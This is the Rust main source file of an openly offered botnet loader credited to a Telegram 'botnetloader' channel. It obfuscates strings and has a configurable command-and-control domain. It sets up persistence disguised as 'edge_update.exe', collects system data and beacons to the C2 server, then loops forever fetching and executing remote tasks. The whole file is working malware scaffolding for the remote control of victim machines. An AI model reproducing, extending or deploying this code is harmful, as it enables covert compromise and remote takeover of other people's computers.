use crate::{comm::{fetch_tasks, initial_contact}, info::collect_system_data, persistence::setup_persistence, task::parse_tasks_and_exec};
use obfstr::obfstr as s;
use core::time;
use std::{sync::LazyLock, thread};

mod info;
mod comm;
mod task;
mod persistence;

//////////////////////////////////////////////////////////////
// https://github.com/endrophys - https://t.me/botnetloader //
//////////////////////////////////////////////////////////////

// Don't be a skid

// CHANGE C2 DOMAIN HERE
// DO NOT ADD THE "/" AFTER YOUR TLD (ex: VALID: http://127.0.0.1, https://example.com; INVALID: http://127.0.0.1/, https://example.com/)
static _DOMAIN: LazyLock<String> = LazyLock::new(|| s!("http://127.0.0.1").to_string());
const TIMEOUT_SEC: u64 = 30;

// CHANGE THIS TO true(enable) OR false(disable) FOR PERSISTANCE SUPPORT
const PERSISTENCE: bool = true;

fn main() {
    if PERSISTENCE {
        let _ = setup_persistence("Package", "edge_update.exe");
    }
    let data = collect_system_data();

    loop {
        if !initial_contact(&data) {
            thread::sleep(time::Duration::from_secs(TIMEOUT_SEC));
            continue;
        }
        break;
    }

    loop {
        parse_tasks_and_exec(fetch_tasks(&data));
        thread::sleep(time::Duration::from_secs(TIMEOUT_SEC));
    }
}